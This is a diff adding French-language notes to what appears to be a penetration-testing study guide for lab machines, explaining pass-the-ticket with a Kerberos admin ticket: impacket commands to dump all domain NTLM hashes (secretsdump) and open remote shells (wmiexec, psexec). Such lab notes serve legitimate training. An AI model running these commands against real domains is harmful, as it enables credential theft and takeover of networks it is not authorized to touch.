@@ -132,3 +132,29 @@ export KRB5CCNAME=Administrator.ccache
 impacket-mssqlclient -k -no-pass -windows-auth breachdc.breach.vl
 ```
 ![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804170104.png)
+
+Explication technique (pas une piste de scénario, juste la mécanique) :
+
+Un fichier .ccache est un ticket Kerberos (ici un TGT admin obtenu via impacket). Pour l'utiliser, il faut l'exporter dans une variable d'environnement que les outils impacket savent lire :
+
+bash
+export KRB5CCNAME=/chemin/vers/administrator_FOREST.htb.local.ccache
+
+Ensuite, tu utilises n'importe quel outil impacket avec le flag -k (kerberos auth) et -no-pass (pas de mot de passe, on utilise le ticket) :
+
+bash
+secretsdump.py -k -no-pass forest.htb.local
+
+ou pour un shell direct :
+
+bash
+wmiexec.py -k -no-pass forest.htb.local
+
+ou
+
+bash
+psexec.py -k -no-pass forest.htb.local
+
+Point important : Kerberos authentifie par nom d'hôte, pas par IP. Il faut donc que ton /etc/hosts contienne l'entrée correspondant au FQDN du domaine (forest.htb.local), sinon l'authentification Kerberos échouera même avec un ticket valide.
+
+Si secretsdump fonctionne, tu auras tous les hashes NTLM du domaine — de quoi terminer proprement.
